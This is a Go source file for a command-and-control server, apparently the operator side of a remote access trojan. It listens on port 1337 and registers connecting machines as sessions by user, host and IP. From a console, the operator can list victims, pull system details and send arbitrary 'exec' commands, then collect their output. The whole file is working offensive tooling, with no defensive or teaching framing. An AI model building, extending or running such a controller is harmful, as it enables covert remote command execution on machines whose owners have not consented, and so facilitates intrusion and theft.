package main

import (
	"bufio"
	"fmt"
	"net"
	"os"
	"strings"
	"sync"
	"time"
)

type Client struct {
	conn     net.Conn
	addr     string
	user     string
	host     string
	ip       string
	respChan chan string
}

var (
	clients      = make(map[string]*Client)
	clientsMutex sync.Mutex
)

func main() {
	port := "1337"
	if len(os.Args) > 1 {
		port = os.Args[1]
	}

	listener, err := net.Listen("tcp", ":"+port)
	if err != nil {
		panic(err)
	}
	defer listener.Close()

	fmt.Println("[SERVER] Listening on port", port)
	go acceptClients(listener)

	reader := bufio.NewReader(os.Stdin)
	for {
		fmt.Print("[SERVER] > ")
		input, _ := reader.ReadString('\n')
		input = strings.TrimSpace(input)

		switch input {
		case "list":
			handleList(reader)
		case "q":
			fmt.Println("Exiting server...")
			return
		default:
			fmt.Println("Unknown command. Available: list, q")
		}
	}
}

func acceptClients(listener net.Listener) {
	for {
		conn, err := listener.Accept()
		if err != nil {
			fmt.Println("[SERVER] Error accepting connection:", err)
			continue
		}

		go func(c net.Conn) {
			buffer := make([]byte, 1024)
			n, err := c.Read(buffer)
			if err != nil {
				c.Close()
				return
			}

			info := strings.Split(strings.TrimSpace(string(buffer[:n])), "|")
			if len(info) < 3 {
				c.Close()
				return
			}

			client := &Client{
				conn:     c,
				user:     info[0],
				host:     info[1],
				ip:       info[2],
				addr:     c.RemoteAddr().String(),
				respChan: make(chan string, 100),
			}

			clientsMutex.Lock()
			sessionID := fmt.Sprintf("%d", len(clients)+1)
			clients[sessionID] = client
			clientsMutex.Unlock()

			fmt.Println("[SERVER] New client connected:", sessionID, "-", client.user+"@"+client.host, client.addr)

			go func(cl *Client) {
				reader := bufio.NewReader(cl.conn)
				for {
					msg, err := reader.ReadString('\n')
					if err != nil {
						clientsMutex.Lock()
						delete(clients, sessionID)
						clientsMutex.Unlock()
						fmt.Println("[SERVER] Client disconnected:", sessionID)
						return
					}
					cl.respChan <- strings.TrimRight(msg, "\r\n")
				}
			}(client)
		}(conn)
	}
}

// Displays connected clients and allows managing a selected one.
func handleList(reader *bufio.Reader) {
	for {
		clientsMutex.Lock()
		if len(clients) == 0 {
			fmt.Println("No clients connected.")
			clientsMutex.Unlock()
			return
		}

		fmt.Println("\n--- CLIENTS SNAPSHOT ---")
		ids := []string{}
		i := 1
		for sid, c := range clients {
			fmt.Printf("%d: %s@%s (%s)\n", i, c.user, c.host, c.ip)
			ids = append(ids, sid)
			i++
		}
		clientsMutex.Unlock()

		fmt.Print("> ")
		input, _ := reader.ReadString('\n')
		input = strings.TrimSpace(input)

		if input == "q" {
			return
		}
		if input == "u" {
			continue
		}

		idx := -1
		fmt.Sscanf(input, "%d", &idx)
		if idx < 1 || idx > len(ids) {
			fmt.Println("Invalid selection.")
			continue
		}
		clientID := ids[idx-1]
		handleClientMenu(reader, clientID)
		return
	}
}

// Handles client-specific operations (exec, info, etc.).
func handleClientMenu(reader *bufio.Reader, clientID string) {
	clientsMutex.Lock()
	client, ok := clients[clientID]
	clientsMutex.Unlock()
	if !ok {
		fmt.Println("Client disconnected.")
		return
	}

	for {
		fmt.Printf("\nManaging client %s@%s (%s)\n> ", client.user, client.host, client.ip)
		input, _ := reader.ReadString('\n')
		input = strings.TrimSpace(input)

		switch {
		case input == "q":
			return

		case input == "info":
			_, err := client.conn.Write([]byte("INFO\n"))
			if err != nil {
				fmt.Println("Error sending command:", err)
				return
			}

			select {
			case resp := <-client.respChan:
				parts := strings.Split(resp, "|")
				if len(parts) == 5 {
					fmt.Printf("INFO from client:\n User: %s\n Host: %s\n OS: %s\n RAM: %s\n IP: %s\n",
						parts[0], parts[1], parts[2], parts[3], parts[4])
				} else {
					fmt.Println("INFO from client (raw):", resp)
				}
			case <-time.After(5 * time.Second):
				fmt.Println("No response from client.")
			}

		case strings.HasPrefix(input, "exec "):
			cmdStr := strings.TrimPrefix(input, "exec ")
			_, err := client.conn.Write([]byte("EXEC:" + cmdStr + "\n"))
			if err != nil {
				fmt.Println("Error sending exec command:", err)
				continue
			}

			resp := ""
			timeout := time.After(15 * time.Second)

		collectLoop:
			for {
				select {
				case line := <-client.respChan:
					if strings.HasSuffix(line, "<END>") {
						resp += strings.TrimSuffix(line, "<END>")
						break collectLoop
					}
					resp += line + "\n"
				case <-timeout:
					fmt.Println("No response from client.")
					break collectLoop
				}
			}

			if resp == "" {
				fmt.Println("EXEC output: (no output)")
			} else {
				fmt.Println("EXEC output:\n" + resp)
			}

		default:
			fmt.Println("Unknown command. Available: info, exec <command>, q")
		}
	}
}
